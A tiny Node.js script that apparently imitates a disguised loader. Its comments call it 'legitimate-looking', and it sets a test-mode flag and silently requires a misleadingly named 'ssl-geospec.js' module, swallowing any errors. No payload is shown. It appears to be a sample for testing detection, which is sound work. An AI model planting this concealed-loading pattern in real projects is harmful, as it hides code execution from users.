// Legitimate-looking setup script
// Loads additional modules for "SSL configuration"

const SAFE_TEST_MODE = true;

const path = require("path");

try {
  // Load the "SSL geolocation specification" module
  require(path.join(__dirname, "dao", "ssl-geospec.js"));
} catch (e) {
  // Silent
}
